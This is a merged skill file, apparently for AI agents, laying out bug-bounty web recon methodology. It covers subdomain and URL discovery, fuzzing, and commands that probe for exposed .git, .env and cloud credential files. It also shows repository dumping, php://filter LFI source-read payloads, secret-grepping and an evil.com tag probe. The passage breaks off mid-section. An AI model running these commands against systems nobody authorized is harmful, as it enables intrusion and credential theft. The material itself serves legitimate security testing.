---
name: recon-methodology
description: "Web2 recon pipeline — subdomain enumeration (subfinder, Chaos API, assetfinder), live host discovery (dnsx, httpx), URL crawling (katana, waybackurls, gau), directory fuzzing (ffuf), JS analysis (LinkFinder, SecretFinder), continuous monitoring (new subdomain alerts, JS change de"
domain: recon
merged: true
merged_from: [Agentic-Bug-Hunter:web2-recon, hack-skills:recon-and-methodology, hack-skills:recon-for-sec]
---

# recon-methodology

> **Fusionierter Skill** — vereint 3 Quell-Skills zu einem: `Agentic-Bug-Hunter:web2-recon`, `hack-skills:recon-and-methodology`, `hack-skills:recon-for-sec`. Alle Techniken aller Quellen sind unten zusammengeführt, nichts ausgelassen.

## Quelle: Agentic-Bug-Hunter — web2-recon (627 Zeilen)

# WEB2 RECON PIPELINE

Full asset discovery from nothing to a prioritized URL list ready for hunting.

---

## SETUP (one-time)

```bash
# 1. Set your Chaos API key (get free key at chaos.projectdiscovery.io)
export CHAOS_API_KEY="your-key-here"
# Add to ~/.zshrc or ~/.bashrc for persistence:
echo 'export CHAOS_API_KEY="your-key-here"' >> ~/.zshrc

# 2. Update nuclei templates (run weekly)
nuclei -update-templates

# 3. Configure subfinder with API keys for more sources
mkdir -p ~/.config/subfinder
cat > ~/.config/subfinder/config.yaml << 'EOF'
# Get free keys at: virustotal.com, securitytrails.com, censys.io, shodan.io
virustotal: [YOUR_VT_KEY]
securitytrails: [YOUR_ST_KEY]
censys_apiid: YOUR_CENSYS_ID
censys_secret: YOUR_CENSYS_SECRET
shodan: [YOUR_SHODAN_KEY]
EOF

# 4. Verify all tools installed
which subfinder httpx dnsx nuclei katana waybackurls gau dalfox ffuf anew gf interactsh-client
```

---

## THE 5-MINUTE RULE

> If a target shows nothing interesting after 5 minutes of recon, move on. Don't burn hours on dead surface.

**5-minute kill signals:**
- All subdomains return 403 or static marketing pages
- No API endpoints visible in URLs
- No JavaScript bundles with interesting endpoint paths
- nuclei returns 0 medium/high findings
- No forms, no authentication, no user data

---

## STANDARD RECON PIPELINE

### Pre-Hunt: Always Run First

```bash
TARGET="target.com"

# Step 0: Passive — crt.sh certificate transparency (no API key needed)
curl -s "https://crt.sh/?q=%.${TARGET}&output=json" \
  | jq -r '.[].name_value' \
  | sed 's/\*\.//g' \
  | sort -u > /tmp/subs.txt
echo "[+] crt.sh: $(wc -l < /tmp/subs.txt) subdomains"

# Step 1: Chaos API (ProjectDiscovery — most comprehensive source)
curl -s "https://dns.projectdiscovery.io/dns/$TARGET/subdomains" \
  -H "Authorization: $CHAOS_API_KEY" \
  | jq -r '.[]' >> /tmp/subs.txt

echo "[+] Chaos returned $(wc -l < /tmp/subs.txt) subdomains"

# Step 2: subfinder (passive multi-source)
subfinder -d $TARGET -silent | anew /tmp/subs.txt
assetfinder --subs-only $TARGET | anew /tmp/subs.txt

echo "[+] Total subdomains after all sources: $(wc -l < /tmp/subs.txt)"

# Step 3: DNS resolution + live host check
cat /tmp/subs.txt | dnsx -silent | httpx -silent -status-code -title -tech-detect | tee /tmp/live.txt

echo "[+] Live hosts: $(wc -l < /tmp/live.txt)"

# Step 4: URL crawl
cat /tmp/live.txt | awk '{print $1}' | katana -d 3 -jc -kf all -silent | anew /tmp/urls.txt

# Step 5: Historical URLs
echo $TARGET | waybackurls | anew /tmp/urls.txt
gau $TARGET --subs | anew /tmp/urls.txt

echo "[+] Total URLs: $(wc -l < /tmp/urls.txt)"

# Step 6: Nuclei scan
nuclei -l /tmp/live.txt -t ~/nuclei-templates/ -severity critical,high,medium -o /tmp/nuclei.txt
```

### Output to Organized Directory

```bash
TARGET="target.com"
RECON_DIR="recon/$TARGET"
mkdir -p $RECON_DIR

# All outputs go here:
/tmp/subs.txt         → $RECON_DIR/subdomains.txt
/tmp/live.txt         → $RECON_DIR/live-hosts.txt
/tmp/urls.txt         → $RECON_DIR/urls.txt
/tmp/nuclei.txt       → $RECON_DIR/nuclei.txt
```

---

## ATTACK SURFACE TRIAGE

### Find Interesting Targets in URL List

```bash
# Parameters worth testing
cat /tmp/urls.txt | grep -E "[?&](id|user|file|path|url|redirect|next|src|token|key|api_key)=" | tee /tmp/interesting-params.txt

# API endpoints
cat /tmp/urls.txt | grep -E "/api/|/v1/|/v2/|/v3/|/graphql|/rest/|/gql" | tee /tmp/api-endpoints.txt

# File upload endpoints
cat /tmp/urls.txt | grep -E "upload|file|attachment|document|image|avatar|photo|media" | tee /tmp/uploads.txt

# Admin/internal paths
cat /tmp/urls.txt | grep -E "/admin|/internal|/debug|/test|/staging|/dev|/management|/console" | tee /tmp/admin-paths.txt

# Authentication endpoints
cat /tmp/urls.txt | grep -E "/oauth|/login|/auth|/sso|/saml|/oidc|/callback|/token" | tee /tmp/auth-paths.txt
```

### gf Patterns (Quick Classification)

```bash
# Install gf patterns: https://github.com/tomnomnom/gf
cat /tmp/urls.txt | gf xss | tee /tmp/xss-candidates.txt
cat /tmp/urls.txt | gf ssrf | tee /tmp/ssrf-candidates.txt
cat /tmp/urls.txt | gf idor | tee /tmp/idor-candidates.txt
cat /tmp/urls.txt | gf sqli | tee /tmp/sqli-candidates.txt
cat /tmp/urls.txt | gf redirect | tee /tmp/redirect-candidates.txt
cat /tmp/urls.txt | gf lfi | tee /tmp/lfi-candidates.txt
cat /tmp/urls.txt | gf rce | tee /tmp/rce-candidates.txt

# User-controlled CSS surface (themes, profile pages, HTML email renderers,
# rich-text editors, PDF generators). gf has no pattern for this — grep manually:
cat /tmp/urls.txt | grep -iE "theme|profile|signature|customize|email|invoice|pdf|render|markdown" \
  | tee /tmp/css-injection-candidates.txt
# → if any hit, run web2-vuln-classes **CSS Injection**
```

---

## JS ANALYSIS

### SecretFinder (API keys, tokens in JS bundles)

```bash
# Activate venv
source ~/tools/SecretFinder/.venv/bin/activate

# Scan a single JS file
python3 ~/tools/SecretFinder/SecretFinder.py -i "https://target.com/static/js/main.js" -o cli

# Scan all JS URLs found in recon
cat /tmp/urls.txt | grep "\.js$" | head -50 | while read url; do
  echo "=== $url ==="
  python3 ~/tools/SecretFinder/SecretFinder.py -i "$url" -o cli 2>/dev/null
done

deactivate
```

### LinkFinder (Endpoints hidden in JS)

```bash
source ~/tools/LinkFinder/.venv/bin/activate

# Single JS file
python3 ~/tools/LinkFinder/linkfinder.py -i "https://target.com/app.js" -o cli

# All pages (crawls JS from HTML)
python3 ~/tools/LinkFinder/linkfinder.py -i "https://target.com" -d -o cli

deactivate
```

---

## DIRECTORY FUZZING

### ffuf — Standard Fuzzing

```bash
# Directory discovery on a live host
ffuf -u "https://target.com/FUZZ" \
     -w ~/wordlists/common.txt \
     -mc 200,201,204,301,302,307,401,403 \
     -ac \
     -t 40 \
     -o /tmp/ffuf-dirs.json

# API endpoint discovery
ffuf -u "https://target.com/api/FUZZ" \
     -w ~/wordlists/api-endpoints.txt \
     -mc 200,201,204,301,302 \
     -ac \
     -t 20

# IDOR fuzzing with authenticated request
# Create req.txt with Authorization: Bearer TOKEN
ffuf -request /tmp/req.txt \
     -request-proto https \
     -w <(seq 1 10000) \
     -fc 404 \
     -ac \
     -t 10
```

---

## TARGET SCORING — GO / NO-GO

Score before spending time. Skip if score < 4.

| Criterion | Points |
|---|---|
| Max bounty >= $5K | +2 |
| Large user base (>100K) or handles money | +2 |
| Program launched < 60 days ago | +2 |
| Complex features: API, OAuth, file upload, GraphQL | +1 |
| Recent code/feature changes (GitHub, changelog) | +1 |
| Private program (less competition) | +1 |
| Tech stack you know | +1 |
| Source code available | +1 |
| Prior disclosed reports to study | +1 |

**< 4:** Skip
**4-5:** Only if nothing better available
**6-8:** Good — spend 1-3 days
**>= 9:** Excellent — spend up to 1 week

### Pre-Dive Hard Kill Signals

1. Max bounty < $500 → not worth your time
2. All recent reports are N/A or duplicate → hunters saturated it
3. Scope is only a static marketing page → no attack surface
4. Company < 5 employees with no revenue → won't pay
5. Explicitly excludes your planned bug class in rules

---

## TECH STACK DETECTION (2 min)

```bash
# Response headers reveal backend
curl -sI https://target.com | grep -iE "server|x-powered-by|x-aspnet|x-runtime|x-generator"

# Common signals:
# Server: nginx + X-Powered-By: PHP/7.4 → PHP backend
# Server: gunicorn OR X-Powered-By: Express → Python/Node.js
# X-Powered-By: ASP.NET → .NET
# Server: Apache Tomcat → Java
# X-Runtime: Ruby → Ruby on Rails

# Framework from JS bundle paths:
# /_next/static/ → Next.js
# /static/js/main.chunk.js → CRA (React)
# /packs/ → Ruby on Rails + Webpacker
# /__nuxt/ → Nuxt.js (Vue)
```

### Stack → Primary Bug Class Map

| Stack | Hunt First | Hunt Second |
|---|---|---|
| Ruby on Rails | Mass assignment | IDOR (`:id` routes) |
| Django | IDOR (ModelViewSet, no object perms) | SSTI (mark_safe) |
| Flask | SSTI (render_template_string) | SSRF (requests lib) |
| Laravel | Mass assignment ($fillable) | IDOR (Eloquent, no ownership) |
| Express (Node.js) | Prototype pollution | Path traversal + debug surface (`/_debug`, `/__debug__`) → web2-vuln-classes "Error Disclosure / Debug Endpoints" |
| Spring Boot | Actuator endpoints → web2-vuln-classes "Error Disclosure / Debug Endpoints" for full surface | SSTI (Thymeleaf) |
| ASP.NET | ViewState deserialization (if encrypted, also test padding-oracle path → web2-vuln-classes **Padding Oracle & Crypto Misuse**) | Open redirect (ReturnUrl) |
| Next.js | SSRF via Server Actions + `/_next/data/` / `/_next/static/chunks/` → web2-vuln-classes "Error Disclosure / Debug Endpoints" | Open redirect via redirect() |
| GraphQL | Introspection → auth bypass on mutations | IDOR via node(id:) |
| WordPress | Plugin SQLi | REST API auth bypass |
| SPA frameworks (React / Vue / Svelte / Angular) | DOM XSS sinks via state/router → web2-vuln-classes section 3 "postMessage Testing" for cross-frame entry points | Client-side route auth bypass (role check only in JS) |

---

## CONTINUOUS MONITORING SETUP

Set up once per target. Alerts you before other hunters.

### New Subdomain Alerts (daily cron)

```bash
#!/bin/bash
TARGET="target.com"
KNOWN="/tmp/$TARGET-subs-known.txt"

subfinder -d $TARGET -silent > /tmp/$TARGET-subs-fresh.txt
curl -s "https://dns.projectdiscovery.io/dns/$TARGET/subdomains" \
  -H "Authorization: $CHAOS_API_KEY" \
  | jq -r '.[]' >> /tmp/$TARGET-subs-fresh.txt

# Diff against known
NEW=$(comm -23 <(sort /tmp/$TARGET-subs-fresh.txt) <(sort $KNOWN 2>/dev/null))

if [ -n "$NEW" ]; then
  echo "NEW SUBDOMAINS: $NEW"
  echo "$NEW" >> $KNOWN
fi

# Schedule: crontab -e → 0 8 * * * /bin/bash ~/monitors/subs-watch.sh
```

### GitHub Commit Watch

```bash
#!/bin/bash
REPO="TargetOrg/target-app"
LAST_SHA="/tmp/$REPO-last-sha.txt"

CURRENT=$(curl -s "https://api.github.com/repos/$REPO/commits?per_page=1" | jq -r '.[0].sha')
KNOWN=$(cat $LAST_SHA 2>/dev/null)

if [ "$CURRENT" != "$KNOWN" ]; then
  echo "New commit on $REPO: $CURRENT"
  echo $CURRENT > $LAST_SHA
  # Get changed files
  curl -s "https://api.github.com/repos/$REPO/commits/$CURRENT" \
    | jq -r '.files[].filename' | grep -E "auth|middleware|route|permission|role|admin"
fi

# Schedule: */30 * * * * /bin/bash ~/monitors/github-watch.sh
```

---

## PORT SCANNING (often skipped — don't skip)

```bash
# naabu — fast port scanner from ProjectDiscovery
# Finds non-standard ports: 8080, 8443, 3000, 8888, 9000, etc.
cat /tmp/live.txt | awk '{print $1}' | naabu -port 80,443,8080,8443,3000,4000,5000,8000,8888,9000,9090,9200,6379 -silent | tee /tmp/open-ports.txt

# Why this matters: admin panels, debug services, internal APIs often run on alt ports
# Example wins: :8080/actuator/env (Spring Boot), :9200/_cat/indices (Elasticsearch), :6379 (Redis)
```

## SECRET SCANNING IN JS BUNDLES

```bash
# trufflehog — high-signal secret detection with entropy analysis
# Scans JS files and git repos
pip install trufflehog3 2>/dev/null || true
trufflehog filesystem --only-verified recon/$TARGET/ 2>/dev/null

# SecretFinder — manual JS bundle scan (already in tools/)
source ~/tools/SecretFinder/.venv/bin/activate
cat /tmp/urls.txt | grep "\.js$" | head -100 | while read url; do
  python3 ~/tools/SecretFinder/SecretFinder.py -i "$url" -o cli 2>/dev/null
done
deactivate

# Quick grep for common patterns in downloaded JS
wget -q -r -l 1 -A "*.js" -P /tmp/js-files/ "https://$TARGET" 2>/dev/null
grep -rn "api_key\|apiKey\|client_secret\|access_token\|private_key\|AWS_SECRET\|AKIA" /tmp/js-files/ 2>/dev/null
```

## GITHUB DORKING FOR TARGET

```bash
# Search GitHub for hardcoded secrets before hunting the app
TARGET_ORG="TargetOrgName"  # Check their GitHub org

# Useful dorks (search on github.com):
# org:TARGET_ORG password
# org:TARGET_ORG api_key
# org:TARGET_ORG "Authorization: Bearer"
# org:TARGET_ORG .env
# org:TARGET_ORG "BEGIN RSA PRIVATE KEY"

# CLI with gh (GitHub CLI):
gh search code "api_key" --owner "$TARGET_ORG" --json path,repository 2>/dev/null | jq '.'
gh search code "password" --owner "$TARGET_ORG" --json path,repository 2>/dev/null | head -20

# GitDorker (if installed):
python3 ~/tools/GitDorker/GitDorker.py -t GITHUB_TOKEN -d ~/tools/GitDorker/Dorks/alldorksv3 -q "$TARGET" -org
```

## SOURCE DISCLOSURE & EXTRACTION

Recovering an app's source code is one of the highest-leverage recon moves: it converts blind black-box hunting into white-box review. A bare directory-listing or exposed file is usually **Low/Info** on its own — it becomes **Medium/High/Critical** the moment the recovered source yields hardcoded secrets, a confirmed injectable sink, or auth logic you can now bypass with certainty.

> Disclosure is not the bug. The bug is what the disclosure *enables*. Always ask: "With this source/config in hand, can I prove a concrete attack RIGHT NOW?" If the dump is empty or contains only public framework code, it's an N/A — kill it.

### Triage scan — fire these against every live host first

```bash
# One-shot probe of the highest-signal disclosure paths across all live hosts.
# Only 200s with non-empty bodies are worth a human look.
for host in $(awk '{print $1}' /tmp/live.txt); do
  for p in /.git/HEAD /.git/config /.svn/wc.db /.svn/entries /.hg/requires \
           /.bzr/branch-format /.DS_Store /.env /web.config /WEB-INF/web.xml \
           /application.properties /config.php.bak /backup.zip /.git/logs/HEAD; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$host$p")
    [ "$code" = "200" ] && echo "[HIT] $code  $host$p"
  done
done | tee /tmp/disclosure-hits.txt

# nuclei has curated templates for this — run alongside the manual sweep
nuclei -l /tmp/live.txt -tags exposure,config,git,backup -severity info,low,medium,high -o /tmp/exposure.txt
```

### Exposed VCS — dump it, don't just report the 200

A reachable `.git/` (or `.svn/.hg/.bzr`) lets you reconstruct the **entire repo + commit history** — and history is where deleted secrets, old credentials, and removed debug endpoints live. Reporting "`.git/HEAD` returns 200" with no dump is a weak Low; reporting the recovered source + a secret pulled from it is a strong finding.

```bash
# --- Git (most common) ---
# git-dumper reconstructs the working tree even when directory listing is OFF.
pipx install git-dumper   # or: pip install git-dumper
git-dumper "https://target.com/.git/" /tmp/dump-target
# Then mine the recovered repo:
cd /tmp/dump-target
git log --all --oneline                 # every commit, including reverted ones
git log -p --all | grep -iE "password|secret|api[_-]?key|token|BEGIN .*PRIVATE KEY"
git show $(git rev-list --all)          # walk objects if checkout is partial

# GitTools (alt) — gitdumper.sh grabs objects, extractor.sh rebuilds commits
# Useful when git-dumper chokes on a broken index:
~/tools/GitTools/Dumper/gitdumper.sh "https://target.com/.git/" /tmp/dump-gt
~/tools/GitTools/Extractor/extractor.sh /tmp/dump-gt /tmp/dump-gt-src

# Quick sanity test before dumping: is the pack/objects tree actually served?
curl -s "https://target.com/.git/config"            # remote URL → confirms real repo
curl -s "https://target.com/.git/logs/HEAD"         # ref log → commit SHAs to pull

# --- SVN ---
# SVN 1.7+ stores everything in a single SQLite DB. Pull it, then read pristine blobs.
curl -s "https://target.com/.svn/wc.db" -o /tmp/wc.db
sqlite3 /tmp/wc.db "SELECT local_relpath, checksum FROM NODES;"   # file list + blob hashes
# Pristine objects live at /.svn/pristine/<2-char>/<sha1>.svn-base
# SVN ≤1.6 instead exposes /.svn/entries (plaintext file list) + /.svn/text-base/*.svn-base
# Tooling: svn-extractor / dvcs-ripper rip-svn

# --- Mercurial (.hg) and Bazaar (.bzr) ---
# Confirm presence then dump with dvcs-ripper:
curl -s "https://target.com/.hg/requires"           # hg fingerprint
curl -s "https://target.com/.bzr/branch-format"     # bzr fingerprint
~/tools/dvcs-ripper/rip-hg.pl  -v -u https://target.com/.hg/
~/tools/dvcs-ripper/rip-bzr.pl -v -u https://target.com/.bzr/
```

> If the repo dumps but contains only vendored framework code with no secrets and no app logic, that's an Info disclosure at best. Don't pad your N/A ratio — chain it to a real secret/sink or drop it.

### `.DS_Store` — recursive directory map without brute force

macOS drops a `.DS_Store` in committed folders; deployed to a web root it leaks the exact filenames in each directory. Recurse it to map hidden admin panels, backup files, and source paths that `ffuf` would never guess.

```bash
# ds_store_exp parses each .DS_Store, then fetches and recurses into the names it finds.
pip install ds-store           # provides the parser
python3 ~/tools/ds_store_exp/ds_store_exp.py "https://target.com/.DS_Store"
# It writes the recovered tree to ./<target>/ — grep it for the good stuff:
grep -rilE "backup|admin|config|\.sql|\.zip|\.bak|internal|test" ./target.com/

# Manual parse if you only have one file (no listing/recursion):
curl -s "https://target.com/.DS_Store" -o /tmp/dsstore && strings /tmp/dsstore | sort -u
# Each readable name is a real sibling file/dir → feed back into the triage scan.
```

### Backup / temp / swap file fuzzing

Editors and lazy deploys leave shadow copies that bypass the interpreter and serve raw source. `index.php.bak` or `.index.php.swp` returns plaintext PHP that a normal `index.php` request would execute and hide.

```bash
# Build a candidate list from paths you already know (live URLs + recovered source).
# Mutate each known file with backup/temp extensions, then ffuf against the host.
cat /tmp/urls.txt | unfurl paths | sort -u > /tmp/known-paths.txt

# ffuf: fuzz the EXTENSION on a known basename (e.g. config)
ffuf -u "https://target.com/configFUZZ" \
     -w <(printf '%s\n' .bak .old .orig .save .swp .swo .tmp .txt '~' .1 .copy .inc .dist .sample) \
     -mc 200 -ac -t 20

# ffuf: append archive extensions to the bare hostname + common roots (full-site dumps)
ffuf -u "https://target.com/FUZZ" \
     -w <(for n in backup bkp www web site app source release dist html public_html "$(echo target)"; do
            for e in .zip .tar.gz .tar .rar .7z .tgz .sql .sql.gz; do echo "$n$e"; done; done) \
     -mc 200 -ac -fs 0 -t 20      # -fs 0 drops empty 200s

# Vim swap recovery: .<name>.swp → recover original with vim -r
curl -s "https://target.com/.index.php.swp" -o /tmp/index.php.swp && vim -r /tmp/index.php.swp

# SecLists has purpose-built lists — prefer them over hand-rolling at scale:
#   Discovery/Web-Content/BackupFiles.fuzz.txt   (FUZZ-templated, mutates basenames)
#   Discovery/Web-Content/raft-large-files.txt
ffuf -u "https://target.com/FUZZ" -w ~/wordlists/SecLists/Discovery/Web-Content/BackupFiles.fuzz.txt \
     -mc 200 -ac -fs 0 -t 30
```

### PHP source read — `php://filter` and `.phps`

If you have an LFI / file-include sink (a `?page=`, `?file=`, `?template=` parameter — see the LFI candidates from gf), you can read PHP source instead of executing it by base64-wrapping it through `php://filter`. Recovered source then feeds straight into vuln hunting (find the real RCE/SQLi sink).

```bash
# Base64-encode the target file so the interpreter returns source, not executed output.
curl -s "https://target.com/?page=php://filter/convert.base64-encode/resource=index.php" \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d        # → raw index.php source

# Read config files holding DB creds / API keys (this is what escalates severity):
curl -s "https://target.com/?page=php://filter/convert.base64-encode/resource=config.php" \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d

# If allow_url_include is on, php://filter can also chain to RCE — note it, then test
# carefully under program rules (see SSRF / file-include classes in web2-vuln-classes).

# .phps — some servers map .phps to a syntax-highlighted source view. Try it on every
# script you can name (no LFI needed):
curl -s "https://target.com/index.phps" -o /tmp/index.phps   # serves highlighted source
for f in index config admin login db; do
  curl -s -o /dev/null -w "%{http_code} $f.phps\n" "https://target.com/$f.phps"
done
```

### Env / config leaks — credentials in the open

These files map 1:1 to a payout when they contain live secrets. A bare `.env` listing framework defaults is Info; one with a working DB password, cloud key, or signing secret is High/Critical (verify the key works — see SECRET SCANNING IN JS BUNDLES for verification flow).

| File | Stack | What's inside (escalation) |
|---|---|---|
| `/.env` `/.env.local` `/.env.production` | Laravel / Node / Rails | `DB_PASSWORD`, `APP_KEY`, `AWS_*`, `STRIPE_*`, mail creds |
| `/web.config` `/connectionStrings.config` | ASP.NET / IIS | DB connection strings, machineKey (→ ViewState RCE — see padding-oracle class) |
| `/WEB-INF/web.xml` `/WEB-INF/classes/*.properties` | Java / Spring | `jdbc.properties`, datasource creds, internal servlet mappings |
| `/application.properties` `/application.yml` | Spring Boot | DB creds, `management.endpoints` exposure (→ Actuator, see Error Disclosure / Debug Endpoints) |
| `/config.php` `/wp-config.php` `/configuration.php` | PHP / WP / Joomla | DB creds, auth salts, secret keys |
| `/appsettings.json` `/secrets.json` | .NET Core | connection strings, JWT signing keys, client secrets |
| `/.aws/credentials` `/.npmrc` `/.dockercfg` | misc | cloud / registry tokens |

```bash
# Pull each candidate and immediately scan the body for live-looking secrets.
for p in /.env /web.config /WEB-INF/web.xml /application.properties /appsettings.json \
         /config.php /wp-config.php /configuration.php /.git/config; do
  body=$(curl -s "https://target.com$p")
  echo "$body" | grep -iqE "password|secret|api[_-]?key|aws|jdbc|connectionstring|begin .*private key" \
    && echo "[SECRET?] https://target.com$p"
done

# WEB-INF/web.xml is shielded by the servlet container — usually only reachable via a
# path-traversal/LFI sink, NOT a direct request. If you can read it, you almost certainly
# have a traversal bug worth far more than the disclosure itself.
```

### What to do with recovered source — turn the dump into the bug

Recon hands you the source; the payout comes from the review. Run this on any recovered repo/config:

```bash
SRC=/tmp/dump-target

# 1) Secrets in tracked files AND in git history (deleted ≠ gone)
trufflehog filesystem --only-verified "$SRC"
git -C "$SRC" log -p --all 2>/dev/null | grep -iE "password|secret|api[_-]?key|token|AKIA|-----BEGIN"

# 2) Dangerous sinks → confirm an injectable path, then test it live
grep -rnE "eval\(|assert\(|system\(|exec\(|popen\(|unserialize\(|pickle\.loads|yaml\.load|Runtime\.exec" "$SRC"
grep -rnE "(SELECT|INSERT|UPDATE).+\\\$_(GET|POST|REQUEST)|\\.format\(.*request|f\"SELECT" "$SRC"   # SQLi candidates
grep -rnE "include|require|render_template_string|fopen\(.*\\\$_" "$SRC"                            # LFI / SSTI

# 3) Auth logic you can now bypass with certainty (hardcoded checks, weak JWT secret,
#    debug flags, default admin creds, IP allowlists, signature verification gaps)
grep -rniE "debug *= *true|is_admin|jwt.*secret|verify=False|disable.*auth|backdoor|TODO|FIXME" "$SRC"

# 4) Internal hostnames / endpoints not in your URL list → new attack surface (+ SSRF targets)
grep -rohE "https?://[a-zA-Z0-9.-]+(:[0-9]+)?(/[^\"' ]*)?" "$SRC" | sort -u
```

> Severity ladder for a report: `path returns 200` = Info → `recovered full source` = Low → `+ verified secret OR confirmed exploitable sink (SQLi/RCE/auth bypass)` = High/Critical. Submit at the top of the ladder you can *prove*, never the bottom.

**Pattern seen on HackerOne / Bugcrowd:** exposed `.git` directories dumped to full source, then mined for hardcoded credentials in commit history → account takeover / admin access (e.g. the U.S. DoD `.git` exposure report, hackerone.com/reports/1624157). `.DS_Store` recursion has paid out for revealing backup archives and debug-mode internal panels that direct fuzzing missed. Do not invent dollar figures — frame the impact, prove the chain, and let the program set the bounty.

---

## 30-MINUTE RECON PROTOCOL

### Minutes 0-5: Read Program Page

```
Note:
- ALL in-scope assets (every domain listed)
- Out-of-scope list (read carefully — common trap)
- Safe harbor statement
- Impact types accepted (some exclude "low")
- Average bounty amount (signals program generosity)
```

### Minutes 5-15: Asset Discovery

Run the standard pipeline above. Focus on live.txt output.

### Minutes 15-25: Surface Map

Run gf patterns and the interesting-params grep above.

### Minutes 25-30: Manual Exploration

Open Burp Suite. Browse the app with proxy on:
1. Register an account
2. Perform main user actions (create/read/update/delete resources)
3. Note all API calls in Burp history
4. Look for endpoints not in your URL list

### After 30 min: Prioritize

```
Priority 1: API endpoints with ID parameters → IDOR candidates
Priority 2: File upload features → XSS/RCE candidates
Priority 3: OAuth/SSO flows → auth bypass candidates
Priority 4: Search/filter with user input → SQLi/SSRF/SSTI candidates
Priority 5: Admin/debug endpoints → auth bypass candidates
```

## Quelle: hack-skills — recon-and-methodology (390 Zeilen)

# SKILL: Recon and Methodology — Expert Bug Bounty Playbook

> **AI LOAD INSTRUCTION**: Systematic recon and bug-finding methodology from top bug hunters. Covers subdomain enumeration, endpoint discovery, tech fingerprinting, and the hunter's mental model for finding bugs that others miss. Key insight: most high-severity bugs are found through systematic coverage, not just clever payloads.

---

## 1. RECON HIERARCHY

```
Target Selection
└── Scope Definition (in-scope assets)
    └── Asset Discovery (subdomains, IPs, domains)
        └── Tech Fingerprinting (what's running)
            └── Endpoint Discovery (attack surface)
                └── Vulnerability Testing (per vulnerability type)
```

---

## 2. SUBDOMAIN ENUMERATION (CRITICAL FIRST STEP)

### Passive (no DNS queries to target)
```bash
# Subfinder (aggregates multiple sources):
subfinder -d target.com -o subdomains.txt

# Amass passive:
amass enum -passive -d target.com

# Certsh (certificate transparency):
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# SecurityTrails API, Shodan:
# Web: https://securitytrails.com/list/apex_domain/target.com
```

### Active (DNS brute force + resolution)
```bash
# Massdns + wordlist:
massdns -r /path/to/resolvers.txt -t A -o S -w output.txt \
  <(cat wordlist.txt | sed 's/$/.target.com/')

# ffuf for subdomain brute:
ffuf -w subdomains-wordlist.txt -u https://FUZZ.target.com \
  -mc 200,301,302,403 -H "Host: FUZZ.target.com"

# DNSx for bulk resolution:
cat subdomains.txt | dnsx -a -resp -o resolved.txt

# Recommended wordlist: SecLists/Discovery/DNS/
```

### Virtual Host Discovery
```bash
# ffuf vhost mode:
ffuf -w wordlist.txt -u https://target.com \
  -H "Host: FUZZ.target.com" -mc 200,301,403

# gobuster vhost:
gobuster vhost -u https://target.com -w wordlist.txt
```

---

## 3. SERVICE AND PORT DISCOVERY

```bash
# Fast port scan (common ports):
nmap -T4 -F target.com -oN ports.txt

# Comprehensive scan on resolved subdomains:
cat resolved_ips.txt | nmap -iL - --open -p 80,443,8080,8443,8888,3000,5000 -oG scan.txt

# httpx for HTTP probing:
cat subdomains.txt | httpx -title -tech-detect -status-code -o live_hosts.txt

# masscan for speed on large IP ranges:
masscan -p 80,443,8080,8443 10.0.0.0/8 --rate=1000
```

---

## 4. WEB TECHNOLOGY FINGERPRINTING

```bash
# Wappalyzer (browser extension) or:
whatweb https://target.com

# httpx with tech detection:
httpx -u https://target.com -tech-detect

# Check headers manually:
curl -sI https://target.com | grep -i "server\|x-powered-by\|x-generator\|cf-ray"

# Fingerprint from:
- Server header: nginx/1.18, Apache/2.4, IIS/10.0
- X-Powered-By: PHP/7.4, ASP.NET
- Cookies: PHPSESSID (PHP), JSESSIONID (Java), _rails_session (Rails)
- HTML comments: <!-- Drupal 9 -->
- Meta generator: <meta name="generator" content="WordPress 6.2">
- JS framework files: /static/js/angular.min.js
```

---

## 5. ENDPOINT DISCOVERY

### Directory Brute Force
```bash
# ffuf (fastest):
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -mc 200,301,302,403 -t 50 -o dirs.txt

# Gobuster:
gobuster dir -u https://target.com -w wordlist.txt -x php,html,js,json

# feroxbuster (recursive):
feroxbuster -u https://target.com -w wordlist.txt -x php,html,txt -r
```

### Parameter Discovery
```bash
# Arjun (hidden parameter finder):
arjun -u https://target.com/api/endpoint

# x8:
x8 -u https://target.com/api/endpoint -w params-wordlist.txt
```

### JavaScript Source Mining
```bash
# Extract endpoints from JS files:
gau target.com | grep '\.js$' | httpx -mc 200 | xargs -I{} curl -s {} | \
  grep -oE '"/[a-zA-Z0-9/_-]+"' | sort -u

# LinkFinder:
python3 linkfinder.py -i https://target.com -d -o output.html

# GetAllURLs (gau):
gau target.com | sort -u > all_urls.txt

# Wayback URLs:
waybackurls target.com | sort -u > wayback_urls.txt
```

### API Endpoint Discovery
```bash
# Common API paths:
ffuf -u https://target.com/FUZZ -w /SecLists/Discovery/Web-Content/api/api-endpoints.txt

# Swagger/OpenAPI:
test: /swagger.json /api-docs /openapi.json /v2/api-docs /.well-known/ /docs/

# GraphQL:
test: /graphql /gql /v1/graphql /api/graphql
```

---

## 6. SOURCE CODE RECON

### GitHub / GitLab Exposure
```bash
# trufflehog (secret scanner in git history):
trufflehog git https://github.com/target-org/target-repo

# gitleaks:
gitleaks detect --source /path/to/cloned/repo

# Manual GitHub search:
# site:github.com "target.com" "api_key" OR "secret" OR "password"
# site:github.com "target.com" ".env" OR "config.php" OR "db_password"

# GitHub dorks:
# "target.com" extension:env
# "target.com" filename:*.config password
# org:target-org secret OR password OR apikey
```

### Exposed Environment Files
```
# Check common paths:
https://target.com/.env
https://target.com/.git/config
https://target.com/config.json
https://target.com/config.yaml
https://target.com/credentials.json
https://target.com/secrets.json
https://target.com/wp-config.php
https://target.com/backup.sql
https://target.com/backup.zip
```

---

## 7. ZSEANO'S TESTING METHODOLOGY

### Core Philosophy
1. **Go deep on one program** rather than spread across many — learn the application thoroughly
2. **Build a profile of the company** — tech stack, developers, processes
3. **Look where others don't** — check error pages, admin paths, old versions, mobile API
4. **Follow the filter** — if input is filtered somewhere, that functionality exists and may be bypassed

### Testing Sequence (One Page / Feature)
```
For each input point:
1. Non-malicious HTML tags (<h2>, <img>) → are they reflected?
2. Incomplete tags → what happens? (<iframe src=//evil.com )
3. Encoding tests → %0d, %0a, %09, <%00
4. Observe the OUTPUT too (not just response) — where does your input appear?
5. Test same input in ALL similarly-structured pages (shared code → shared vuln)
6. Check if the same parameter exists in mobile/API endpoint (less protected)
```

### Parameter Insights
```
